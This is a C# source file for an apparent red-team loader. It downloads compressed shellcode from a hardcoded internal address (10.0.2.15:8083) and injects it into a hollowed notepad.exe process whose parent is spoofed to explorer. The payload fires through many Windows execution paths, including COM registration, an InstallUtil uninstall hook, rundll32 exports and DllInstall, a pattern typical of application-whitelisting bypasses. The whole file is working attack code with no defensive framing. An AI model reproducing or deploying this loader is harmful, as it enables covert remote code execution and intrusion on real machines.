using System;
using System.Net;
using System.Diagnostics;
using System.Windows.Forms;
using System.EnterpriseServices;
using System.Runtime.InteropServices;

using RGiesecke.DllExport;

[assembly: ApplicationActivation(ActivationOption.Server)]
[assembly: ApplicationAccessControl(false)]

public class NotepadExecTest
{
    private static byte[] GetShellcode(string url)
    {
        WebClient client = new WebClient();
        client.Proxy = WebRequest.GetSystemWebProxy();
        client.Proxy.Credentials = CredentialCache.DefaultCredentials;
        string compressedEncodedShellcode = client.DownloadString(url);
        return Generic.DecompressShellcode(Convert.FromBase64String(compressedEncodedShellcode));
    }

    private static int FindProcessPid(string process)
    {
        int pid = 0;

        int session = Process.GetCurrentProcess().SessionId;

        Process[] processes = Process.GetProcessesByName(process);

        foreach (Process proc in processes)
        {
            if (proc.SessionId == session)
            {
                pid = proc.Id;
            }
        }

        return pid;
    }

    public static void Flame()
    {
        string binary = @"c:\\windows\system32\\notepad.exe";
        string url = @"http://10.0.2.15:8083";

        byte[] shellcode = GetShellcode(url);
        int ppid = FindProcessPid("explorer");

        if (ppid != 0)
        {
            try
            {
                var hollower = new Hollower();
                hollower.Hollow(binary, shellcode, ppid);
            }
            catch (Exception e)
            {
                Console.WriteLine(" [x] {0}", e.Message);
            }
        }
        else
        {
            Environment.Exit(1);
        }        
    }

    public static void ExecParam(string a)
    {
        MessageBox.Show(a);
        Flame();
    }
}

[System.ComponentModel.RunInstaller(true)]
public class TikiThing : System.Configuration.Install.Installer
{
    public override void Uninstall(System.Collections.IDictionary savedState)
    {
        NotepadExecTest.Flame();
    }
}

[ComVisible(true)]
[Guid("31D2B969-7608-426E-9D8E-A09FC9A51680")]
[ClassInterface(ClassInterfaceType.None)]
[ProgId("dllguest.Bypass")]
[Transaction(TransactionOption.Required)]
public class Bypass : ServicedComponent
{
    public Bypass() { Console.WriteLine("breaching-is-love!"); }

    [ComRegisterFunction]
    public static void RegisterClass(string key)
    {
        NotepadExecTest.Flame();
    }

    [ComUnregisterFunction]
    public static void UnRegisterClass(string key)
    {
        NotepadExecTest.Flame();
    }

    public void Exec() { NotepadExecTest.Flame(); }
}

class Exports
{

    [DllExport("EntryPoint", CallingConvention = CallingConvention.StdCall)]
    public static void EntryPoint(IntPtr hwnd, IntPtr hinst, string lpszCmdLine, int nCmdShow)
    {
        NotepadExecTest.Flame();
    }

    [DllExport("DllRegisterServer", CallingConvention = CallingConvention.StdCall)]
    public static bool DllRegisterServer()
    {
        NotepadExecTest.Flame();
        return true;
    }

    [DllExport("DllUnregisterServer", CallingConvention = CallingConvention.StdCall)]
    public static bool DllUnregisterServer()
    {
        NotepadExecTest.Flame();
        return true;
    }

    [DllExport("DllInstall", CallingConvention = CallingConvention.StdCall)]
    public static void DllInstall(bool bInstall, IntPtr a)
    {
        string b = Marshal.PtrToStringUni(a);
        NotepadExecTest.ExecParam(b);
    }
}